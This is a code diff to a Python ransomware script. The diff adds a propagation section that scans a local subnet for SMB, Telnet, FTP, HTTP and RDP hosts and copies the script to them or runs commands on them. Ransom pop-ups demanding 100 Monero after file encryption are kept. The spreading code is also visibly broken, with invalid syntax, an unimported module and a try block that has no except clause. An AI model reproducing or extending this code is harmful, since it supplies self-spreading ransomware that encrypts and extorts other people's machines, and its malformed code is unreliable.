@@ -1,5 +1,15 @@
 # Author: SergioZ3R0
 #region Imports
+from cyberSec.pythonRandsomware.spread import network_prefix
+
+
+
+
+
+
+
+
+
 imports = ["subprocess", "sys", "os", "ctypes", "socket", "datetime", "time", "window", "cryptography", "ftplib", "telnetlib", "pywinrm", "pysmb"]
 #Install necessary modules
 def install(package): # Install the required package
@@ -99,6 +109,40 @@ except:
 #os.remove("key.key")
 #os.remove("encryption_time.txt")
 #os.remove("unified_file.txt")
+#region Spread
+network_prefix = "192.168.1"
+try:
+    # Call functions from spread module and execute specific functions
+    open_smb_hosts = spread.scan_network_for_smb(network_prefix)
+    for host in open_smb_hosts:
+        spread.upload_script_to_smb(host, ./pythonRandosmware)
+        # Ejecutar función específica para SMB
+        # Aquí puedes agregar la función específica que deseas ejecutar
+
+    open_telnet_hosts = spread.scan_network_for_telnet(network_prefix)
+    for host in open_telnet_hosts:
+        spread.execute_command_on_telnet(host, "echo 'Hello from Telnet'")
+        # Ejecutar función específica para Telnet
+        # Aquí puedes agregar la función específica que deseas ejecutar
+
+    open_ftp_hosts = spread.scan_network_for_ftp(network_prefix)
+    for host in open_ftp_hosts:
+        spread.upload_script_to_ftp(host, __file__)
+        # Ejecutar función específica para FTP
+        # Aquí puedes agregar la función específica que deseas ejecutar
+
+    open_http_hosts = spread.scan_network_for_http(network_prefix)
+    for host in open_http_hosts:
+        spread.upload_script_to_http(host, __file__)
+        # Ejecutar función específica para HTTP
+        # Aquí puedes agregar la función específica que deseas ejecutar
+
+    open_rdp_hosts = spread.scan_network_for_rdp(network_prefix)
+    for host in open_rdp_hosts:
+        spread.execute_command_on_rdp(host, "echo 'Hello from RDP'")
+        # Ejecutar función específica para RDP
+        # Aquí puedes agregar la función específica que deseas ejecutar
+#endregion
 window.Window()
 if sys.platform == "linux":
     subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
@@ -106,6 +150,4 @@ else:
     ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted Send me 100 Monero(XMR) to my wallet(WALLET)", "Notification", 1)
 print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
 
-network_prefix="192.168.1"
-open_ftp_hosts = scan_network_for_open_ftp(network_prefix)
 #os.remove("darthvader.py")
